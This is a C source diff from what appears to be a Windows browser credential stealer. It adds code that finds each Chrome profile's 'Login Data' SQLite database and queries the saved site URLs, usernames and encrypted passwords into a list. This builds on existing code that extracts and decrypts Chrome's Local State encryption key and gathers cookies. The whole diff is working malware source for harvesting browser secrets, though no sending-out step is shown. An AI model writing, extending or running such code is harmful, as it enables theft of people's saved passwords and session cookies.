@@ -1,4 +1,5 @@
 #include "LF_Crypter.c"
+#include "LF_SQLite.c"
 #include "LF_Utils.c"
 
 #include <stdint.h>
@@ -7,20 +8,22 @@
 
 #define LF_CHROME_MAX_PROFILES 10
 
+// _A_ = append to ... path
 #define LF_CHROME__USERDATA_PATH "\\Google\\Chrome\\User Data"
 #define LF_CHROME__LOCALSTATE_A_PATH "\\Local State"
+#define LF_CHROME__LOGIN_DATA_A_PATH "\\Login Data"
 
 struct LF_Chrome_login_data_struct
 {
-  unsigned char *action_url;
-  unsigned char *username_value;
-  unsigned char *password_value;
+  char *action_url;
+  char *username_value;
+  char *password_value;
 };
 struct LF_Chrome_cookie_data_struct
 {
-  unsigned char *host_key;
-  unsigned char *name;
-  unsigned char *value;
+  char *host_key;
+  char *name;
+  char *value;
 };
 struct LF_Chrome_data_struct
 {
@@ -42,6 +45,12 @@ LF_Chrome__get_localstate_path (char *userdata_path, char *out)
 {
   strcpy (out, userdata_path);
   strcat (out, LF_CHROME__LOCALSTATE_A_PATH);
+}
+void
+LF_Chrome__get_login_data_path (char *profile_path, char *out)
+{
+  strcpy (out, profile_path);
+  strcat (out, LF_CHROME__LOGIN_DATA_A_PATH);
 }
 char *
 LF_Chrome__get_encryption_key (char *localstate_path, int *len)
@@ -87,6 +96,20 @@ LF_Chrome__profile_search_callback (char *dir_path, WIN32_FIND_DATA ffd,
                           strdup (folder_path));
 }
 void
+LF_Chrome__login_data_db_search_callback (
+    void *data, struct LF_SQLite_entry_struct *entries)
+{
+  struct LF_Chrome_login_data_struct *login_data
+      = malloc (sizeof (struct LF_Chrome_login_data_struct));
+  // are those strdup's free'd?
+  login_data->action_url = strdup (entries[0].value);
+  login_data->username_value = strdup (entries[1].value);
+  login_data->password_value = strdup (entries[2].value); // encrypted
+
+  LF_Utils_arraylist_add ((struct LF_Utils_arraylist_struct *)data,
+                          login_data);
+}
+void
 LF_Chrome__populate_profile_arraylist (char *userdata_path,
                                        struct LF_Utils_arraylist_struct *out)
 {
@@ -127,13 +150,24 @@ LF_Chrome_populate_data (struct LF_Chrome_data_struct *out)
         {
           continue;
         }
+
+      char login_data_path[MAX_PATH];
+      LF_Chrome__get_login_data_path (profile_path, login_data_path);
+
+      {
+        const char *sql
+            = "SELECT action_url, username_value, password_value FROM logins";
+        LF_SQLite_exec (login_data_path, sql,
+                        LF_Chrome__login_data_db_search_callback,
+                        out->login_data_list);
+      }
     }
   free (encryption_key);
   free (decrypted_key);
 }
 void
 LF_Chrome_free_data (struct LF_Chrome_data_struct *out)
-{
+{  
   LF_Utils_arraylist_free (out->profile_path_list);
   LF_Utils_arraylist_free (out->login_data_list);
   LF_Utils_arraylist_free (out->cookie_data_list);
